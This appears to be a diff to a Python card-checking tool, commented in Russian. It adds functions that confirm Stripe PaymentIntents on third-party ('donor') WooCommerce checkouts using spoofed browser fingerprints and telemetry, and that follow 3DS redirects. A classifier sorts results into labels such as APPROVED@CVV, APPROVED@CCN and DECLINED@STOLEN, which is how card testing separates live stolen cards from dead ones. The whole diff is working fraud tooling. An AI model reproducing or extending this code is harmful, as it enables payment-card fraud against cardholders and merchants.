@@ -3,6 +3,7 @@
 # advanced_gate_scanner.py и scratch-диагностики. Любая правка верстки WooCommerce
 # чинится ЗДЕСЬ один раз.
 import asyncio
+import json
 import os
 import random
 import re
@@ -431,6 +432,188 @@ def wc_attribution_fields(donor_url: str) -> dict:
         "wc_order_attribution_session_pages": "2",
         "wc_order_attribution_session_count": "1",
     }
+
+
+# --- Sprint 3 core (Фаза 2): PaymentIntent retrieve/confirm + 3DS2 ---
+
+MAX_PI_AMOUNT_CENTS = 10000  # выше — CHARGE_RISK: не подтверждаем
+
+
+async def stripe_retrieve_pi(session, pk: str, secret: str) -> dict | None:
+    """Разведка перед confirm (бесплатно): amount/currency/capture_method/status.
+    None = секрет мёртв или сеть упала."""
+    pi_id = secret.split("_secret_")[0]
+    try:
+        r = await session.get(
+            f"https://api.stripe.com/v1/payment_intents/{pi_id}",
+            params={"key": pk, "client_secret": secret},
+            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
+                     "Accept": "application/json"},
+            timeout=10)
+        if r.status_code != 200:
+            return None
+        d = r.json()
+        if d.get("error"):
+            return None
+        return {"amount": d.get("amount"), "currency": (d.get("currency") or "").upper(),
+                "capture_method": d.get("capture_method"), "status": d.get("status")}
+    except Exception:
+        return None
+
+
+async def stripe_confirm_pi(session, pk: str, secret: str, pm_id: str,
+                            donor_origin: str, telem: dict) -> dict:
+    """POST /v1/payment_intents/{pi}/confirm с полным fingerprint-набором.
+    Возвращает сырой JSON Stripe; классификация — classify_pi_verdict()."""
+    pi_id = secret.split("_secret_")[0]
+    body = {
+        "key": pk,
+        "client_secret": secret,
+        "payment_method": pm_id,
+        "expected_payment_method_type": "card",
+        "use_stripe_sdk": "true",
+        "return_url": f"{donor_origin.rstrip('/')}/",
+        "payment_user_agent": telem["payment_user_agent"],
+        "referrer": donor_origin,
+        "time_on_page": telem["time_on_page"],
+        "guid": telem["guid"],
+        "muid": telem["muid"],
+        "sid": telem["sid"],
+    }
+    try:
+        r = await session.post(
+            f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
+            data=body,
+            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
+                     "Accept": "application/json"},
+            timeout=12)
+        return r.json()
+    except Exception as e:
+        return {"error": {"type": "network_error", "message": f"{type(e).__name__}: {e}"}}
+
+
+async def stripe_3ds2_authenticate(session, pk: str, source_id: str) -> dict:
+    """3DS2 fingerprint/challenge-вход. transStatus Y → frictionless,
+    C → challenge (карта жива и enrolled), иначе failed."""
+    browser = {
+        "fingerprintAttempted": True,
+        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "language": "en-US",
+        "colorDepth": 24,
+        "screenHeight": 1080,
+        "screenWidth": 1920,
+        "timeZoneOffset": -120,
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "javaEnabled": False,
+        "javascriptEnabled": True,
+    }
+    import json as _json
+    try:
+        r = await session.post(
+            "https://api.stripe.com/v1/3ds2/authenticate",
+            data={"key": pk,
+                  "three_d_secure_2[source]": source_id,
+                  "three_d_secure_2[browser]": _json.dumps(browser)},
+            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
+                     "Accept": "application/json"},
+            timeout=12)
+        d = r.json()
+        ts = _find_key(d, "transStatus") or ""
+        state = _find_key(d, "state") or ""
+        return {"transStatus": ts, "state": state, "raw": d}
+    except Exception as e:
+        return {"transStatus": "", "state": "", "raw": {"error": str(e)}}
+
+
+RE_AUTOSUBMIT_FORM = re.compile(
+    r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>(.*?)</form>', re.S | re.I)
+
+
+async def stripe_3ds_follow_redirect(session, redirect_url: str, max_hops: int = 5) -> dict:
+    """3DS1/fallback: цепочка auto-submit форм до финального лендинга.
+    Cookie-jar обязателен (ACS ставит свои куки). Возвращает последний HTML+URL."""
+    url = redirect_url
+    html = ""
+    for _ in range(max_hops):
+        try:
+            r = await session.get(url, timeout=12, allow_redirects=True)
+            html = r.text
+            url = str(r.url)
+        except Exception as e:
+            return {"final_url": url, "html": "", "posted": False, "error": str(e)}
+        m = RE_AUTOSUBMIT_FORM.search(html)
+        if not m or ("onload" not in html and "submit()" not in html):
+            break
+        action, inner = m.group(1), m.group(2)
+        if action.startswith("/"):
+            from urllib.parse import urlparse
+            p = urlparse(url)
+            action = f"{p.scheme}://{p.netloc}{action}"
+        fields = {}
+        for inp in RE_HIDDEN_INPUT.findall(inner):
+            nm = RE_INPUT_NAME.search(inp)
+            vl = RE_INPUT_VALUE.search(inp)
+            if nm and vl:
+                fields[nm.group(1)] = vl.group(1)
+        try:
+            r2 = await session.post(action, data=fields, timeout=12, allow_redirects=True)
+            html = r2.text
+            url = str(r2.url)
+        except Exception as e:
+            return {"final_url": action, "html": html[:500], "posted": True, "error": str(e)}
+    return {"final_url": url, "html": html[:2000], "posted": True, "error": ""}
+
+
+def pi_secret_alive(pi_resp: dict) -> bool:
+    """После неудачного confirm секрет жив, если PI вернулся в requires_payment_method
+    (или ошибка card_error — карта отклонена, intent не отменён)."""
+    st = pi_resp.get("status")
+    if st == "requires_payment_method":
+        return True
+    err = pi_resp.get("error") or {}
+    return err.get("type") == "card_error"
+
+
+def classify_pi_verdict(pi_resp: dict) -> tuple[str, str]:
+    """Полная таксономия вердиктов для PI-confirm (план §6.2).
+    Возвращает (verdict, detail)."""
+    if pi_resp.get("status") == "succeeded":
+        return "APPROVED", f"PaymentIntent {pi_resp.get('id', '')} succeeded"
+    if pi_resp.get("status") == "requires_capture":
+        return "APPROVED@HOLD", "authorized, capture_method=manual — холд без списания"
+    na = pi_resp.get("next_action") or {}
+    if pi_resp.get("status") == "requires_action" or na:
+        sdk = na.get("use_stripe_sdk") or {}
+        if na.get("redirect_to_url") or sdk.get("type") == "three_d_secure_redirect":
+            return "3DS_REDIRECT", (na.get("redirect_to_url") or {}).get("url", "")
+        return "3DS_REQUIRED", f"use_stripe_sdk type={sdk.get('type', '?')}"
+    err = pi_resp.get("error") or {}
+    code = (err.get("code") or "") + " " + (err.get("decline_code") or "")
+    msg = err.get("message") or json.dumps(pi_resp)[:200]
+    low = (code + " " + msg).lower()
+    if "testmode" in low:
+        return "TEST_MODE", msg
+    if "rate_limit" in low or "too_many_requests" in low:
+        return "RATE_LIMITED", msg
+    if "insufficient_funds" in low:
+        return "APPROVED@CVV", msg
+    if "incorrect_cvc" in low or "invalid cvc" in low or "security code is incorrect" in low:
+        return "APPROVED@CCN", msg
+    if "expired" in low:
+        return "EXPIRED", msg
+    if "stolen" in low or "lost" in low:
+        return "DECLINED@STOLEN", msg
+    if "fraud" in low or "risk" in low:
+        return "DECLINED@FRAUD", msg
+    if "do_not_honor" in low or "do not honor" in low:
+        return "DECLINED@DO_NOT_HONOR", msg
+    if "incorrect_number" in low or "invalid_number" in low or "incorrect number" in low:
+        return "INVALID", msg
+    if "processing_error" in low or "try again" in low or "processing error" in low:
+        return "RETRY", msg
+    if err:
+        return "DECLINED", msg
+    return "UNKNOWN", msg
 
 
 def stripe_telemetry(base_url: str, pk: str, country_code: str = "US",
